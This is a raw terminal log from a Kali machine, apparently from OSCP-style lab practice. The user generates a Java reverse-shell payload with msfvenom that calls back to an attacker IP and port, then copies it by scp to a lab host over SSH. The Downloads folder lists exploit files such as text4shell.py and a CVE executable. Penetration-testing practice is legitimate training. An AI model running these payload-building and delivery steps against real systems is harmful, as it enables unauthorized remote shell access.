@@ -1,0 +1,139 @@
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~[0m]
+└─[1m[34m$[0m msfvenom -p linux/x
+linux/x64/exec                            linux/x64/shell/bind_tcp                  linux/x86/meterpreter/bind_ipv6_tcp       linux/x86/meterpreter_reverse_tcp         linux/x86/shell_bind_tcp_random_port
+linux/x64/meterpreter/bind_tcp            linux/x64/shell_bind_tcp                  linux/x86/meterpreter/bind_ipv6_tcp_uuid  linux/x86/meterpreter/reverse_tcp_uuid    linux/x86/shell/bind_tcp_uuid
+linux/x64/meterpreter_reverse_http        linux/x64/shell_bind_tcp_random_port      linux/x86/meterpreter/bind_nonx_tcp       linux/x86/metsvc_bind_tcp                 linux/x86/shell_find_port
+linux/x64/meterpreter_reverse_https       linux/x64/shell_find_port                 linux/x86/meterpreter/bind_tcp            linux/x86/metsvc_reverse_tcp              linux/x86/shell/find_tag
+linux/x64/meterpreter/reverse_sctp        linux/x64/shell_reverse_ipv6_tcp          linux/x86/meterpreter/bind_tcp_uuid       linux/x86/read_file                       linux/x86/shell_find_tag
+linux/x64/meterpreter/reverse_tcp         linux/x64/shell/reverse_sctp              linux/x86/meterpreter/find_tag            linux/x86/shell/bind_ipv6_tcp             linux/x86/shell/reverse_ipv6_tcp
+linux/x64/meterpreter_reverse_tcp         linux/x64/shell/reverse_tcp               linux/x86/meterpreter_reverse_http        linux/x86/shell_bind_ipv6_tcp             linux/x86/shell/reverse_nonx_tcp
+linux/x64/pingback_bind_tcp               linux/x64/shell_reverse_tcp               linux/x86/meterpreter_reverse_https       linux/x86/shell/bind_ipv6_tcp_uuid        linux/x86/shell/reverse_tcp
+linux/x64/pingback_reverse_tcp            linux/x86/adduser                         linux/x86/meterpreter/reverse_ipv6_tcp    linux/x86/shell/bind_nonx_tcp             linux/x86/shell_reverse_tcp
+linux/x64/set_hostname                    linux/x86/chmod                           linux/x86/meterpreter/reverse_nonx_tcp    linux/x86/shell/bind_tcp                  linux/x86/shell_reverse_tcp_ipv6
+linux/x64/shell_bind_ipv6_tcp             linux/x86/exec                            linux/x86/meterpreter/reverse_tcp         linux/x86/shell_bind_tcp                  linux/x86/shell/reverse_tcp_uuid
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~[0m]
+└─[1m[34m$[0m msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.205 LPORT=8000 -f ja
+jar   java
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~[0m]
+└─[1m[34m$[0m msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.205 LPORT=8000 -f ja
+jar   java
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~[0m]
+└─[1m[34m$[0m msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.205 LPORT=8000 -f jar -o api.jar
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 74 bytes
+Error: The payload could not be generated, check options
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~[0m]
+└─[1m[34m$[0m cat ~/.ssh/id_ed25519.pub
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIImwoUoXRHyqeHjxDHCtVP+IjdzgKylVX8aTKX6GXX+C sk4t4@ThinkPadKali
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~[0m]
+└─[1m[34m$[0m ssh dev@192.168.198.150
+The authenticity of host '192.168.198.150 (192.168.198.150)' can't be established.
+ED25519 key fingerprint is: SHA256:CKGotddlDMa9jHRSxuI8dII4k8L7unIPYHrWSS2SXk4
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.198.150' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-52-generic x86_64)
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+  System information as of Mon Mar 30 08:34:26 PM UTC 2026
+  System load:  0.00146484375      Processes:               205
+  Usage of /:   54.1% of 13.67GB   Users logged in:         0
+  Memory usage: 36%                IPv4 address for ens160: 192.168.198.150
+  Swap usage:   0%
+360 updates can be applied immediately.
+240 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+[1m[32mdev@oscp[0m:[1m[34m~[0m$ exit
+logout
+Connection to 192.168.198.150 closed.
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~[0m]
+└─[1m[34m$[0m ls
+[1m[34mCommon[0m  [1m[34mDesktop[0m  [1m[34mDocuments[0m  [1m[34mDownloads[0m  [1m[36mexploits[0m  [1m[36mHTB[0m  [1m[34mligolo-selfcerts[0m  [1m[34mlogs[0m  [1m[34mMusic[0m  [1m[34mOSCP[0m  [1m[36mPG[0m  [1m[34mPictures[0m  [1m[36mPTD[0m  [1m[34mPublic[0m  [1m[34mSync[0m  [1m[34mTemplates[0m  [1m[36mTHM[0m  [1m[34mVideos[0m  [1m[34mVulnhub[0m  [1m[36mwordlists[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~[0m]
+└─[1m[34m$[0m msfvenom -p linux/shell_reverse_tcp LHOST=192.168.45.205 LPORT=8000 -f jar -o api.jar
+Error: invalid payload: linux/shell_reverse_tcp
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~[0m]
+└─[1m[34m$[0m msfvenom -p linux/ LHOST=192.168.45.205 LPORT=8000 -f jar -o api.jar
+Display all 119 possibilities? (y or n)
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~[0m]
+└─[1m[34m$[0m msfvenom -p linux/x64/ LHOST=192.168.45.205 LPORT=8000 -f jar -o api.jar
+linux/x64/exec                        linux/x64/meterpreter/reverse_sctp    linux/x64/pingback_reverse_tcp        linux/x64/shell_bind_tcp              linux/x64/shell/reverse_sctp
+linux/x64/meterpreter/bind_tcp        linux/x64/meterpreter/reverse_tcp     linux/x64/set_hostname                linux/x64/shell_bind_tcp_random_port  linux/x64/shell/reverse_tcp
+linux/x64/meterpreter_reverse_http    linux/x64/meterpreter_reverse_tcp     linux/x64/shell_bind_ipv6_tcp         linux/x64/shell_find_port             linux/x64/shell_reverse_tcp
+linux/x64/meterpreter_reverse_https   linux/x64/pingback_bind_tcp           linux/x64/shell/bind_tcp              linux/x64/shell_reverse_ipv6_tcp
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~[0m]
+└─[1m[34m$[0m msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.205 LPORT=8000 -f jar -o api.jar
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 74 bytes
+Error: The payload could not be generated, check options
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~[0m]
+└─[1m[34m$[0m msfvenom -p linux/ LHOST=192.168.45.205 LPORT=8000 -f jar -o api.jar
+Display all 119 possibilities? (y or n)
+linux/aarch64/chmod                       linux/mips64/meterpreter_reverse_http     linux/ppc/shell_bind_tcp                  linux/x64/shell/bind_tcp                  linux/x86/metsvc_bind_tcp
+linux/aarch64/meterpreter_reverse_http    linux/mips64/meterpreter_reverse_https    linux/ppc/shell_find_port                 linux/x64/shell_bind_tcp                  linux/x86/metsvc_reverse_tcp
+linux/aarch64/meterpreter_reverse_https   linux/mips64/meterpreter_reverse_tcp      linux/ppc/shell_reverse_tcp               linux/x64/shell_bind_tcp_random_port      linux/x86/read_file
+linux/aarch64/meterpreter/reverse_tcp     linux/mipsbe/exec                         linux/riscv32le/chmod                     linux/x64/shell_find_port                 linux/x86/shell/bind_ipv6_tcp
+linux/aarch64/meterpreter_reverse_tcp     linux/mipsbe/meterpreter_reverse_http     linux/riscv32le/exec                      linux/x64/shell_reverse_ipv6_tcp          linux/x86/shell_bind_ipv6_tcp
+linux/aarch64/shell/reverse_tcp           linux/mipsbe/meterpreter_reverse_https    linux/riscv32le/reboot                    linux/x64/shell/reverse_sctp              linux/x86/shell/bind_ipv6_tcp_uuid
+linux/aarch64/shell_reverse_tcp           linux/mipsbe/meterpreter/reverse_tcp      linux/riscv32le/shell_bind_tcp            linux/x64/shell/reverse_tcp               linux/x86/shell/bind_nonx_tcp
+linux/armbe/meterpreter_reverse_http      linux/mipsbe/meterpreter_reverse_tcp      linux/riscv32le/shell_reverse_tcp         linux/x64/shell_reverse_tcp               linux/x86/shell/bind_tcp
+linux/armbe/meterpreter_reverse_https     linux/mipsbe/reboot                       linux/riscv64le/chmod                     linux/x86/adduser                         linux/x86/shell_bind_tcp
+linux/armbe/meterpreter_reverse_tcp       linux/mipsbe/shell_bind_tcp               linux/riscv64le/exec                      linux/x86/chmod                           linux/x86/shell_bind_tcp_random_port
+linux/armbe/shell_bind_tcp                linux/mipsbe/shell/reverse_tcp            linux/riscv64le/reboot                    linux/x86/exec                            linux/x86/shell/bind_tcp_uuid
+linux/armle/adduser                       linux/mipsbe/shell_reverse_tcp            linux/riscv64le/shell_bind_tcp            linux/x86/meterpreter/bind_ipv6_tcp       linux/x86/shell_find_port
+linux/armle/chmod                         linux/mipsle/exec                         linux/riscv64le/shell_reverse_tcp         linux/x86/meterpreter/bind_ipv6_tcp_uuid  linux/x86/shell/find_tag
+linux/armle/exec                          linux/mipsle/meterpreter_reverse_http     linux/x64/exec                            linux/x86/meterpreter/bind_nonx_tcp       linux/x86/shell_find_tag
+linux/armle/meterpreter/bind_tcp          linux/mipsle/meterpreter_reverse_https    linux/x64/meterpreter/bind_tcp            linux/x86/meterpreter/bind_tcp            linux/x86/shell/reverse_ipv6_tcp
+linux/armle/meterpreter_reverse_http      linux/mipsle/meterpreter/reverse_tcp      linux/x64/meterpreter_reverse_http        linux/x86/meterpreter/bind_tcp_uuid       linux/x86/shell/reverse_nonx_tcp
+linux/armle/meterpreter_reverse_https     linux/mipsle/meterpreter_reverse_tcp      linux/x64/meterpreter_reverse_https       linux/x86/meterpreter/find_tag            linux/x86/shell/reverse_tcp
+linux/armle/meterpreter/reverse_tcp       linux/mipsle/reboot                       linux/x64/meterpreter/reverse_sctp        linux/x86/meterpreter_reverse_http        linux/x86/shell_reverse_tcp
+linux/armle/meterpreter_reverse_tcp       linux/mipsle/shell_bind_tcp               linux/x64/meterpreter/reverse_tcp         linux/x86/meterpreter_reverse_https       linux/x86/shell_reverse_tcp_ipv6
+linux/armle/shell/bind_tcp                linux/mipsle/shell/reverse_tcp            linux/x64/meterpreter_reverse_tcp         linux/x86/meterpreter/reverse_ipv6_tcp    linux/x86/shell/reverse_tcp_uuid
+linux/armle/shell_bind_tcp                linux/mipsle/shell_reverse_tcp            linux/x64/pingback_bind_tcp               linux/x86/meterpreter/reverse_nonx_tcp    linux/zarch/meterpreter_reverse_http
+linux/armle/shell/reverse_tcp             linux/ppc64/shell_bind_tcp                linux/x64/pingback_reverse_tcp            linux/x86/meterpreter/reverse_tcp         linux/zarch/meterpreter_reverse_https
+linux/armle/shell_reverse_tcp             linux/ppc64/shell_find_port               linux/x64/set_hostname                    linux/x86/meterpreter_reverse_tcp         linux/zarch/meterpreter_reverse_tcp
+linux/loongarch64/reboot                  linux/ppc64/shell_reverse_tcp             linux/x64/shell_bind_ipv6_tcp             linux/x86/meterpreter/reverse_tcp_uuid
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~[0m]
+└─[1m[34m$[0m msfvenom -p java/ LHOST=192.168.45.205 LPORT=8000 -f jar -o api.jar
+java/jsp_shell_bind_tcp         java/meterpreter/bind_tcp       java/meterpreter/reverse_https  java/shell/bind_tcp             java/shell_reverse_tcp
+java/jsp_shell_reverse_tcp      java/meterpreter/reverse_http   java/meterpreter/reverse_tcp    java/shell/reverse_tcp
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~[0m]
+└─[1m[34m$[0m msfvenom -p java/ LHOST=192.168.45.205 LPORT=8000 -f jar -o api.jar
+java/jsp_shell_bind_tcp         java/meterpreter/bind_tcp       java/meterpreter/reverse_https  java/shell/bind_tcp             java/shell_reverse_tcp
+java/jsp_shell_reverse_tcp      java/meterpreter/reverse_http   java/meterpreter/reverse_tcp    java/shell/reverse_tcp
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~[0m]
+└─[1m[34m$[0m msfvenom -p java/shell/reverse_tcp LHOST=192.168.45.205 LPORT=8000 -f jar -o api.jar
+Payload size: 5264 bytes
+Final size of jar file: 5264 bytes
+Saved as: api.jar
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~[0m]
+└─[1m[34m$[0m ls
+[1m[31mapi.jar[0m  [1m[34mCommon[0m  [1m[34mDesktop[0m  [1m[34mDocuments[0m  [1m[34mDownloads[0m  [1m[36mexploits[0m  [1m[36mHTB[0m  [1m[34mligolo-selfcerts[0m  [1m[34mlogs[0m  [1m[34mMusic[0m  [1m[34mOSCP[0m  [1m[36mPG[0m  [1m[34mPictures[0m  [1m[36mPTD[0m  [1m[34mPublic[0m  [1m[34mSync[0m  [1m[34mTemplates[0m  [1m[36mTHM[0m  [1m[34mVideos[0m  [1m[34mVulnhub[0m  [1m[36mwordlists[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~[0m]
+└─[1m[34m$[0m scp api.jar dev@192.168.198.150:/home/dev
+api.jar                                                                                                                                                                            100% 5264    53.2KB/s   00:00
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~[0m]
+└─[1m[34m$[0m ls
+[1m[31mapi.jar[0m  [1m[34mCommon[0m  [1m[34mDesktop[0m  [1m[34mDocuments[0m  [1m[34mDownloads[0m  [1m[36mexploits[0m  [1m[36mHTB[0m  [1m[34mligolo-selfcerts[0m  [1m[34mlogs[0m  [1m[34mMusic[0m  [1m[34mOSCP[0m  [1m[36mPG[0m  [1m[34mPictures[0m  [1m[36mPTD[0m  [1m[34mPublic[0m  [1m[34mSync[0m  [1m[34mTemplates[0m  [1m[36mTHM[0m  [1m[34mVideos[0m  [1m[34mVulnhub[0m  [1m[36mwordlists[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~[0m]
+└─[1m[34m$[0m cd Downloads/
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/Downloads[0m]
+└─[1m[34m$[0m ls
+ academy-regular.ovpn              CVE-2023-29360.exe                       index                                      [1m[32mligolo_windows.exe[0m  'supports(1).sql'    [1m[34mTHM[0m                  universal.ovpn
+'base(1).sql'                      d08b041c8e2dfe72cc2ba90bcaed4d1088873f   [1m[34mligolo-ng_agent_0.8.3_linux_amd64[0m          [1m[34mPico[0m                 supports.sql        [1m[31mtroubleshooting.7z[0m   [1m[34mVPN[0m
+ base.sql                         'extensions(1).sql'                       [1m[31mligolo-ng_agent_0.8.3_linux_amd64.tar.gz[0m   ping_tmp.log        'text4shell(1).py'   [1m[32mtroubleshooting.sh[0m   [1m[34mVulnhub[0m
+ [1m[31mchisel_1.11.5_windows_amd64.zip[0m   extensions.sql                           [1m[31mligolo-ng_agent_0.8.3_windows_amd64.zip[0m    README.md            text4shell.py       troubleshoot.log
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/Downloads[0m]
+└─[1m[34m$[0m
